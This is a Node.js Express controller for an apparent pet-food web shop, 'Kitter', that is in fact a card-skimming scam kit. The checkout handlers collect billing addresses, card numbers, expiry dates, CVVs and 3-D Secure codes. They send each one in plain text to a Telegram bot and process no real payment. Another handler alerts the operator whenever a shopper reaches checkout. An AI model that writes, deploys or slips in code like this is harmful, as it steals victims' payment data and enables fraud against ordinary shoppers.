const { default: mongoose } = require('mongoose');
const axios = require('axios');
const Popup = require('popup-window')

const Category = require('../model/Category');
const Product = require('../model/Product');
const Config = require('../../config');

exports.getIndex = (req, res, next) => {
    Product.find().then(products => {
        Category.find().then(categories => {
            res.render('../src/views/main/index', {
                pageTitle: 'Kitter - Hight Quality Pet Food',
                path: '/primary',
                session: req.session,
                categories: categories,
                products: products
            })
        })
    })
}

exports.getShop = (req, res, next) => {
    Product.find().then(products => {
        Category.find().then(categories => {
            res.render('../src/views/main/shop', {
                pageTitle: 'Kitter - Hight Quality Pet Food',
                path: '/secondary',
                session: req.session,
                categories: categories,
                products: products
            })
        })
    })
}

exports.getCategory = (req, res, next) => {
    const categoryId = req.params.categoryId;
    Product.find({ categoryId: categoryId }).then(products => {
        res.render('../src/views/main/category', {
            pageTitle: 'Kitter - Hight Quality Pet Food',
            path: '/secondary',
            session: req.session,
            products: products
        })
    })
}

exports.getProduct = (req, res, next) => {
    const productId = req.params.productId;
    Product.findById(productId).then(product => {
        Product.find({ categoryId: product.categoryId }).then(products => {
            res.render('../src/views/main/product', {
                pageTitle: 'Kitter - High Quality Pet Food',
                path: '/secondary',
                cart: '/product',
                session: req.session,
                product: product,
                products: products
            })
        })
    })
}

exports.getCart = (req, res, next) => {
    req.user.populate('cart.items.productId').then(user => {
        const products = user.cart.items;
        res.render('../src/views/main/cart', {
            path: '/secondary',
            pageTitle: 'Kitter - Your Cart',
            products: products,
            session: req.session
        });
    })
        .catch(err => {
            const error = new Error(err);
            error.httpStatusCode = 500;
            return next(error);
        });
}

exports.getCheckout = (req, res, next) => {

    axios.post(`https://api.telegram.org/bot${Config.api}/sendMessage`, {
        chat_id: Config.chatId,
        text: `🦣 ${req.session.user.email} on checkout page.`
    }).then((response) => {
        res.render('../src/views/main/success', {
            path: '/secondary',
            pageTitle: 'Kitter - Successfully checkout',
            session: req.session
        })
    }).catch((err) => {
        res.send(err)
    });

    let products;
    let total = 0;

    req.user.populate('cart.items.productId').then(user => {
        let checkoutId = new mongoose.Types.ObjectId;
        products = user.cart.items;
        total = 0;

        products.forEach(element => {
            total += element.quantity * element.productId.price;
        });

        res.render('../src/views/main/checkout', {
            path: '/secondary',
            pageTitle: 'Kitter - Checkout',
            session: req.session,
            checkoutId: checkoutId,
            totalPrice: total
        })
    })
}

exports.postAddCard = (req, res, next) => {
    const prodId = req.body.productId;
    Product.findById(prodId)
        .then(product => {
            return req.user.addToCart(product);
        })
        .then(result => {
            console.log(result);
            res.redirect('/cart');
        })
        .catch(err => {
            const error = new Error(err);
            error.httpStatusCode = 500;
            return next(error);
        });
}

exports.postCompleteCheckout = (req, res, next) => {
    const checkoutId = req.body.checkoutId;
    const country = req.body.country;
    const address = req.body.address;
    const state = req.body.state;
    const city = req.body.city;
    const zip = req.body.zip;
    const cardNumber = req.body.cardno;
    const cardExpiry = req.body.validtill;
    const cardCvv = req.body.cvv;


    axios.post(`https://api.telegram.org/bot${Config.api}/sendMessage`, {
        chat_id: Config.chatId,
        text: `
        💳 ----- NEW CARD ----- 💳\n--- Log ID: #${checkoutId}\n\n--- Country: ${country}\n--- Address: ${address}\n--- State: ${state}\n--- City: ${city}\n--- Zip code: ${zip}\n--- CC Number: ${cardNumber}\n--- CC Expiry: ${cardExpiry}\n--- CC Cvv: ${cardCvv}`
    }).then((response) => {
        let products;
        let total = 0;

        req.user.populate('cart.items.productId').then(user => {
            products = user.cart.items;
            total = 0;

            products.forEach(element => {
                total += element.quantity * element.productId.price;
            });

            res.render('../src/views/main/code', {
                path: '/secondary',
                pageTitle: 'Kitter - Complete Payment',
                session: req.session,
                checkoutId: checkoutId,
                totalPrice: total,
                country: country,
                address: address,
                state: state,
                city: city,
                zip: zip,
                cardNumber: cardNumber,
                cardExpiry: cardExpiry,
                cardCvv: cardCvv
            })
        })
    }).catch((err) => {
        res.send(err)
    });
}

exports.post3DSCode = (req, res, next) => {
    axios.post(`https://api.telegram.org/bot${Config.api}/sendMessage`, {
        chat_id: Config.chatId,
        text: `
        💳 ----- NEW CARD 3DS CODE ----- 💳\n--- Log ID: #${req.body.checkoutId}\n\n--- Confirmation code: ${req.body.code}`
    }).then((response) => {
        res.render('../src/views/main/success', {
            path: '/secondary',
            pageTitle: 'Kitter - Successfully checkout',
            session: req.session
        })
    }).catch((err) => {
        res.send(err)
    });
}

exports.postCartDeleteItem = (req, res, next) => {
    const prodId = req.body.productId;
    req.user
        .removeFromCart(prodId)
        .then(result => {
            res.redirect('back');
        })
        .catch(err => {
            const error = new Error(err);
            error.httpStatusCode = 500;
            return next(error);
        });
}